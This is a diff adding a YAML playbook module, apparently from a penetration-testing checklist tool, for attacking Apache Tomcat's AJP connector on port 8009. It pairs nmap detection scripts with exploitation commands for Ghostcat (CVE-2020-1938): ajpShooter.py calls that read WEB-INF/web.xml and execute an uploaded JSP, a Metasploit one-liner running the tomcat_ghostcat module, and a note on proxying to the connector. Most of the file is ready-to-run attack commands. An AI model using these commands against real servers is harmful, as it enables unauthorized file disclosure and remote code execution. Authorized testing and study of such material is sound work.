@@ -1,0 +1,53 @@
+module: ajp
+name: AJP (8009)
+inputs: [OUT]
+
+sections:
+
+  - id: initial
+    name: Initial Access & Detection
+    steps:
+      - id: version
+        text: Confirm live / AJP13 connector
+        commands: |
+          nmap -p$PORT -sV -sC $IP
+          nmap -p$PORT --script=ajp-methods $IP
+      - id: headers
+        text: Probe allowed methods / request headers
+        commands: |
+          nmap -p$PORT --script=ajp-headers,ajp-request $IP
+
+  - id: vuln
+    name: Ghostcat (CVE-2020-1938)
+    steps:
+      - id: check
+        text: Detect Ghostcat LFI/RCE in the AJP connector
+        commands: |
+          nmap -p$PORT --script=ajp-request $IP
+          searchsploit ghostcat
+          searchsploit tomcat ajp
+
+  - id: exploit
+    name: File Read & RCE
+    authorized: true
+    steps:
+      - id: lfi
+        text: Read files inside the webapp (WEB-INF/web.xml, configs)
+        commands: |
+          python3 ajpShooter.py http://$IP $PORT /WEB-INF/web.xml read
+          # metasploit: use auxiliary/admin/http/tomcat_ghostcat
+      - id: msf
+        text: Ghostcat via Metasploit
+        commands: |
+          msfconsole -qx "use auxiliary/admin/http/tomcat_ghostcat; set RHOSTS $IP; set RPORT $PORT; run; exit"
+      - id: rce
+        text: Escalate LFI to RCE (upload + include a JSP)
+        manual: true
+        commands: |
+          # if the app allows file upload, include the uploaded file via the AJP read/eval flow
+          python3 ajpShooter.py http://$IP $PORT /uploaded.jsp eval
+      - id: proxy
+        text: Reach the AJP connector directly via an ajp proxy
+        manual: true
+        commands: |
+          # configure nginx/apache with ajp_pass / mod_proxy_ajp to $IP:$PORT
